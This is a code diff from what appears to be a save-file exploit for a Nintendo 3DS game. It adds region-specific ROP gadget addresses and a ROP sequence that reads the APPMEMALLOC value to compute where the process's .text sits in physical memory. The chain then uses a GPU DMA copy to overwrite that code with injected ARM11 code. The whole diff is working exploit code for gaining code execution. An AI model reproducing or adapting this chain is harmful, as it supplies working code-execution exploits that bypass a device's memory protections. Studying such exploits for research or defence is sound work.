@@ -43,9 +43,9 @@
 #define CODE_ALIGNEDSIZE 0x45b000
 
 #if FWVER < 0x25
-#define TEXTGSPHEAPADDR (0x18000000 - CODE_ALIGNEDSIZE) //Addr of .text relative to the GSP heap @ FCRAM+0 / vaddr 0x14000000.
+#define TEXT_APPMEM_OFFSET CODE_ALIGNEDSIZE //Physmem offset to .text, relative to APPLICATION mem-region end.
 #else
-#define TEXTGSPHEAPADDR (0x18000000 - CODE_ALIGNEDSIZE) + 0x5B000
+#define TEXT_APPMEM_OFFSET (CODE_ALIGNEDSIZE - 0x5B000)
 #endif
 
 #if REGION==1 //USA
@@ -86,6 +86,7 @@
 #define BLXR6 0x2c45e0 //Executes "blx r6", increments r4, then if r4>=16 executes vpop {d8}, pop {r4, r5, r6, r7, r8, r9, sl, pc}
 #define MEMCPY 0x34338c
 #define MEMSET 0x32b184 //r0=adr, r1=size. The first instruction here is "r2=0", therefore jumping to +4 allows controlling the value which is written to the buffer.
+#define ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 0x3255dc //ldr r1, [r1, #4] ; add r1, r1, r2, lsl #3 ; str r1, [r0] ; bx lr
 #else//JPN
 #define RDSAVEBEGINADR 0x3249c4+4
 #define WRSAVEBEGINADR 0x2e5c54+4
@@ -96,6 +97,7 @@
 #define BLXR6 0x2c40f8
 #define MEMCPY 0x342ea4
 #define MEMSET 0x32ac9c
+#define ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 0x3250f4
 #endif
 
 #define REGPOPADR 0x4a5c80 //Addr of this instruction: "pop {r0, r1, r2, r3, r4, r5, r6, fp, ip, pc}"
@@ -727,9 +729,27 @@ SENDCMD SAVEADR+0x1040, 0x040103C0, SAVEADR+0x1180 @ Register this process with 
 .word 0 @ r9
 .word 0 @ sl
 
+.word REGPOPADR //ldr r1, [r1, #4] ; add r1, r1, r2, lsl #3 ; str r1, [r0]
+.word (gxcpy_dstaddr_ropword-_start) + SAVEADR @ r0
+.word 0x1FF80040-4 @ r1
+.word (0x14000000 - TEXT_APPMEM_OFFSET)>>3 @ r2
+.word 0 @ r3
+.word 0x0f @ r4
+.word 0 @ r5
+.word ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 @ r6
+.word 0 @ fp
+.word 0 @ ip
+.word BLXR6 @ Calculate the linearmem address of .text on-the-fly.
+
+.word 0, 0
+.word 0
+.word 0
+.word 0, 0, 0, 0, 0
+
 .word REGPOPADR//This code exec method uses GX command4 to copy arm11code using GPU DMA, to .text.
 .word 0x14700000 @ r0, GPU DMA src addr
-.word TEXTGSPHEAPADDR @ r1, GPU DMA dst addr
+gxcpy_dstaddr_ropword:
+.word 0 @ r1, GPU DMA dst addr. Overwritten by the above ROP.
 .word ARM11CODE_SIZE @ r2, size
 .word 0 @ r3, width0
 .word 0x0f @ r4
@@ -1188,7 +1208,14 @@ str r0, [sp, #8] @ height1
 mov r0, #8
 str r0, [sp, #12] @ flags
 ldr r0, =0x14700000 @ GPU DMA src addr
-ldr r1, =(TEXTGSPHEAPADDR+0x1000) @ GPU DMA dst addr
+
+ldr r1, =0x1FF80040 @ APPMEMALLOC
+ldr r1, [r1]
+ldr r2, =TEXT_APPMEM_OFFSET
+sub r1, r1, r2
+ldr r2, =0x14001000
+add r1, r1, r2 @ GPU DMA dst addr
+
 mov r2, r6 @ size
 mov r3, #0 @ width0
 ldr r4, =GXLOWCMD_4
